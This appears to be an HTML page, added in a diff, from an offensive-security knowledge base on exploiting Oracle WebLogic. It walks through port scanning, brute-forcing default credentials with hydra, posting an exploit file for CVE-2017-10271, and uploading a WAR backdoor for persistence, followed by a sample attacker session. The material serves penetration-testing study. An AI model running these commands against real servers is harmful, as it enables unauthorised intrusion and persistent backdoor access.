@@ -1,0 +1,179 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">WebLogic Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Application Servers</strong> • Focus: <strong>Oracle WebLogic RCE & Admin Abuse</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Oracle WebLogic Server (TCP/7001, 7002) is a widely used enterprise application server. 
+    Misconfigured consoles, weak credentials, and deserialization vulnerabilities have 
+    made WebLogic a frequent target for attackers. Notable CVEs (CVE-2017-10271, 
+    CVE-2019-2725, CVE-2020-14882) allow unauthenticated remote code execution (RCE). 
+    Attackers exploit WebLogic to gain initial access, drop webshells, exfiltrate data, 
+    and pivot deeper into corporate networks.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Exposed Admin Consoles:</strong> Many WebLogic consoles are internet-facing.</li>
+    <li><strong>Default/Weak Credentials:</strong> Admin console often left with weak passwords.</li>
+    <li><strong>Critical CVEs:</strong> Multiple RCE bugs (deserialization, XML parsing, SSRF).</li>
+    <li><strong>Complex Attack Surface:</strong> Supports Java, JMS, T3, IIOP, webapps — multiple vectors.</li>
+    <li><strong>Persistence Potential:</strong> Attackers drop WAR webshells or malicious apps for long-term access.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify WebLogic service on TCP/7001 (HTTP) or 7002 (HTTPS).</li>
+    <li><strong>Authentication:</strong> Attempt default or brute-forced credentials.</li>
+    <li><strong>Enumeration:</strong> Fingerprint WebLogic version via headers or wls-wsat endpoints.</li>
+    <li><strong>Exploitation:</strong> Exploit CVEs (e.g., CVE-2017-10271, CVE-2019-2725, CVE-2020-14882) for RCE.</li>
+    <li><strong>Persistence:</strong> Upload WAR backdoors or deploy malicious applications.</li>
+    <li><strong>Impact:</strong> RCE, data theft, lateral movement across enterprise systems.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for WebLogic on TCP/7001, 7002.</li>
+    <li>Check for accessible admin consoles (<code>/console</code>, <code>/wls-wsat</code>).</li>
+    <li>Attempt authentication with <code>weblogic:weblogic</code> or brute force.</li>
+    <li>Identify version and check against known CVEs.</li>
+    <li>Exploit deserialization/remote execution vulnerabilities.</li>
+    <li>Deploy persistence via WAR file backdoor.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p7001,7002 --script http-title,http-server-header [target]
+
+# ------------------------------
+# Console Access
+# ------------------------------
+curl http://[target]:7001/console/login/LoginForm.jsp
+
+# ------------------------------
+# Fingerprint Version
+# ------------------------------
+curl -i http://[target]:7001/wls-wsat/CoordinatorPortType
+
+# ------------------------------
+# Exploit Example (CVE-2017-10271)
+# ------------------------------
+curl -v -X POST -H "Content-Type: text/xml" \
+--data-binary @exploit.xml \
+http://[target]:7001/wls-wsat/CoordinatorPortType
+
+# ------------------------------
+# Deploy WAR Backdoor (Authenticated)
+# ------------------------------
+curl -u weblogic:weblogic \
+-F "deployment=@backdoor.war" \
+http://[target]:7001/management/deploy
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p7001 192.168.1.250
+curl http://192.168.1.250:7001/console
+hydra -l weblogic -P passwords.txt http-get://192.168.1.250:7001/console
+curl -v -X POST --data-binary @exploit.xml http://192.168.1.250:7001/wls-wsat/CoordinatorPortType
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p7001 192.168.1.250
+PORT     STATE SERVICE
+7001/tcp open  weblogic
+|_http-title: Oracle WebLogic Server Console
+
+[ saide ~ ]$ curl http://192.168.1.250:7001/console
+<html><title>WebLogic Server Console</title></html>
+
+[ saide ~ ]$ hydra -l weblogic -P rockyou.txt http-get://192.168.1.250:7001/console
+[7001][http-get] host: 192.168.1.250   login: weblogic   password: Welcome1
+
+[ saide ~ ]$ curl -v -X POST -H "Content-Type: text/xml" \
+--data-binary @exploit.xml \
+http://192.168.1.250:7001/wls-wsat/CoordinatorPortType
+
+[+] Exploit successful — reverse shell opened as weblogic user
+
+[ saide ~ ]$ curl -u weblogic:Welcome1 -F "deployment=@backdoor.war" http://192.168.1.250:7001/management/deploy
+[+] WAR backdoor deployed at /backdoor
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample WebLogic exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+7001/tcp open  Oracle WebLogic Server Console
+
+# Weak Credentials
+weblogic : Welcome1
+
+# Exploitation
+CVE-2017-10271 deserialization RCE triggered
+
+# Proof of Exploitation
+Reverse shell obtained as weblogic user
+WAR backdoor deployed for persistence
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/7001-7002-pentesting-weblogic" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting WebLogic
+      </a>
+    </li>
+    <li>
+      <a href="https://www.cvedetails.com/product/7846/Oracle-Weblogic-Server.html" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        CVE Details – Oracle WebLogic
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Brute creds → Exploit CVEs (deserialization/SSRF) → RCE → Deploy WAR for persistence.</li>
+  </ul>
+</section>
